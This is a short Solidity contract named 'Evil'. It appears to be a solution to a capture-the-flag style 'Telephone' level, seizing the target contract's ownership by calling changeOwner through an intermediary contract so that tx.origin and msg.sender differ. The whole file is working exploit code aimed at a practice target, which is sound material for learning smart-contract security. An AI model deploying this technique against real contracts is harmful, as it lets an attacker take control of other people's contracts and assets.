// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address) external;
}

contract Evil {
  ITelephone telephone;

  constructor(address _telephone) public {
    telephone = ITelephone(_telephone);
  }

  function gimmeOwner() external {
    telephone.changeOwner(msg.sender);
  }
}